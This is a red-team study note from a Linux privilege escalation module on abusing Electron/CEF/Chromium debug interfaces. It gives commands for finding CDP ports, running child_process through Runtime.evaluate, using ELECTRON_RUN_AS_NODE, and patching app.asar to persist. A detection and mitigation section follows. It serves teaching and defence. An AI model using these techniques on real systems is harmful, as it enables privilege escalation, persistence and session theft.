---
tags: [linux, privesc, electron, chromium, injection, pentesting, red-team]
difficulty: intermediate
module: "44 - Linux Privilege Escalation"
topic: "44.43 Electron / CEF / Chromium Debugger Abuse"
---

# Electron / CEF / Chromium Debugger Abuse

## Introduction
Electron, CEF (Chromium Embedded Framework), and Chromium-based apps embed a full browser/Node runtime and expose a **remote debugging protocol** (the Chrome DevTools Protocol, CDP). When such an app runs with a debugging port open — or can be launched with one — any local process that connects to that port can **execute JavaScript (and via Node, system commands) in the app's context**. On Linux this is a practical local code-execution / privilege-context-abuse technique: if a Chromium/Electron app runs as a more privileged user (root daemon, a different account, or simply a target whose session you want), reaching its debug interface lets you run code as that user. It mirrors the macOS technique in [[12 - Electron Chromium and Interpreted App Injection]] (cross-module sibling) but applies wherever these apps run on Linux.

## How the Debug Interface Becomes Code Execution
```text
+---------------------------------------------------------------+
|         CHROMIUM/ELECTRON REMOTE DEBUG -> CODE EXEC          |
+---------------------------------------------------------------+
|  App started with --remote-debugging-port=PORT (or --inspect) |
|        |  opens a CDP endpoint on 127.0.0.1:PORT              |
|        v                                                       |
|  Local attacker GETs /json -> list of debug targets + ws URL  |
|        |  connect WebSocket, send Runtime.evaluate {JS}        |
|        v                                                       |
|  JS runs in app context; Electron Node integration ->         |
|  require('child_process').exec(...) as the app's UID          |
+---------------------------------------------------------------+
```
Key flags that open the door:
- `--remote-debugging-port=<port>` (Chromium/CEF)
- `--inspect[=host:port]` / `ELECTRON_RUN_AS_NODE=1` (Electron's Node side)

## Exploitation
### 1. App already exposes a debug port
```bash
# find listening debug ports (often 9222 / random localhost)
ss -ltnp | grep -E '12[0-9]{3}|92[0-9]{2}'
curl -s http://127.0.0.1:9222/json | grep webSocketDebuggerUrl
# connect with a CDP client and evaluate JS:
#   Runtime.evaluate  ->  require('child_process').execSync('id > /tmp/p')
```
A small Python/Node CDP client (or `chrome-remote-interface`) sends `Runtime.evaluate` with your JavaScript. In an Electron app with Node integration, that JS can spawn processes as the app's user.

### 2. You can launch the app (or it auto-starts) with debug flags
If a privileged service or another user launches an Electron app and you influence its arguments/env (a wrapper script you can edit, a `.desktop` you control, a writable launcher), inject the debug flag:
```bash
ELECTRON_RUN_AS_NODE=1 /opt/someapp/someapp -e 'require("child_process").exec("id>/tmp/p")'
/opt/someapp/someapp --inspect=127.0.0.1:1337 &   # then attach + evaluate
```
`ELECTRON_RUN_AS_NODE=1` turns the app's signed binary into a plain Node interpreter running your code.

### 3. Tampering app resources
Electron logic lives in `resources/app.asar` or an `app/` dir. If writable (common for apps installed under a user-writable prefix), patch the JS to run your payload every launch — persistence in that user's context.
```bash
npx asar extract app.asar out && echo 'require("child_process").exec("...")' >> out/main.js && npx asar pack out app.asar
```

## Why It Matters in an Engagement
Chromium/Electron apps are common on Linux desktops and even on servers (dashboards, kiosks, dev tools). An open debug port — sometimes left on by misconfiguration, dev builds, or a wrapper that always passes `--remote-debugging-port` — is a clean local code-exec primitive in the app's privilege context. Where that context is more privileged than yours (root kiosk, another user's session), it is privilege escalation; otherwise it is session/credential theft (cookies, tokens) from that app.

## Detection and Mitigation
- Never run production Electron/Chromium apps with `--remote-debugging-port`/`--inspect`; build Electron with **fuses** disabling `runAsNode`/`ELECTRON_RUN_AS_NODE` and Node CLI inspect.
- Make app resources (`app.asar`) non-writable by users and verify integrity at startup.
- Bind any necessary debug port to a restricted interface with authentication; firewall localhost debug ports from other users (namespaces).
- Monitor for `--remote-debugging-port`/`ELECTRON_RUN_AS_NODE` on process launch and for unexpected listeners on debug ports.

## Chaining Opportunities
- Cross-module sibling: [[12 - Electron Chromium and Interpreted App Injection]] (macOS) — same primitive, same `ELECTRON_RUN_AS_NODE`/CDP ideas.
- Influencing app launch args overlaps with [[26 - Systemd Service File Abuse]] and PATH/wrapper hijacks ([[11 - PATH Environment Variable Hijacking]]).

## Related Notes
- [[12 - Electron Chromium and Interpreted App Injection]]
- [[33 - Python Perl Ruby Library Hijacking]]
- [[26 - Systemd Service File Abuse]]
- [[01 - Linux PrivEsc Methodology Overview]]
